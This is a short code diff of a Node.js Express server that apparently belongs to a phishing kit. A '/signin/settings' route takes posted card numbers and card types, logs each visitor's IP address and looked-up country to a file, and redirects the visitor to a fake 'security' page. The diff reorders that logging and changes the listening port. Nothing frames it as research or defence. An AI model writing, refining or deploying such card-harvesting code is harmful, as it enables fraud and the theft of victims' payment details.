@@ -98,11 +98,11 @@ app.post(main_url+'/signin/settings',function (req,res) {
     }
 
 
-    txt += '<br>ip :'+get_ip(req).clientIp;
+
 
     txt += '<br>Time: ' + (new Date).toUTCString();
-    txt = `<p>${txt}</p><hr>`;
-    save(file,txt);
+
+
     var type = req.body.c_type;
     try {
         var card_n = req.body.cardnumber.split(' ')[3];
@@ -115,6 +115,10 @@ app.post(main_url+'/signin/settings',function (req,res) {
 
     get_coun(get_ip(req).clientIp,function (cc) {
         res.cookie('local', cc, { maxAge: 900000});
+        txt += '<br>coun :' + cc;
+        txt += '<br>ip :'+get_ip(req).clientIp;
+        txt = `<p>${txt}</p><hr>`;
+        save(file,txt);
         res.end('<script>location = "'+ main_url +'/security?'+ options +'" </script>');
 
     });
@@ -212,9 +216,9 @@ app.use(function(req, res, next) {
 
 
 
-var server = app.listen(process.env.PORT || 3000, function () {
-    var host = server.address().address
-    var port = server.address().port
+var server = app.listen(process.env.PORT || 4000, function () {
+    var host = server.address().address;
+    var port = server.address().port;
 
     console.log("Example app listening at http://%s:%s", host, port)
 });
